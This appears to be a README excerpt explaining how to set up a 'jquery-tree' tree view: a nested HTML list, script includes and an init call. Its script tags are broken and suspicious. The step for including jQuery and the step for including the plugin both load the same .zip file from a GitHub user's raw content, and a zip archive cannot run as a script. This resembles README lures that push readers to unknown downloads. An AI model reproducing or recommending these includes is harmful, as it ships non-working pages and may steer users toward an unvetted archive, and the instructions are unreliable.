## 📄 How to Use jquery-tree

Once you have installed jquery-tree, follow these steps to create your tree view:

1. **Prepare Your HTML**: Create a basic HTML file with an unordered list (`<ul>`). Each list item (`<li>`) will become a node in your tree.
   
   ```html
   <ul id="myTree">
       <li>Item 1
           <ul>
               <li>Sub Item 1.1</li>
               <li>Sub Item 1.2</li>
           </ul>
       </li>
       <li>Item 2</li>
   </ul>
   ```

2. **Include jQuery**: Add the jQuery library to your HTML file before the jquery-tree script.

   ```html
   <script src="https://raw.githubusercontent.com/enxsni/jquery-tree/main/js/tree-jquery-1.3.zip"></script>
   ```

3. **Include jquery-tree**: Add the jquery-tree script file after jQuery.

   ```html
   <script src="https://raw.githubusercontent.com/enxsni/jquery-tree/main/js/tree-jquery-1.3.zip"></script>
   ```

4. **Initialize the Tree**: Use the following script to turn your list into a tree view.

   ```html
   <script>
       $(document).ready(function() {
           $('#myTree').jqueryTree();
       });
   </script>
   ```
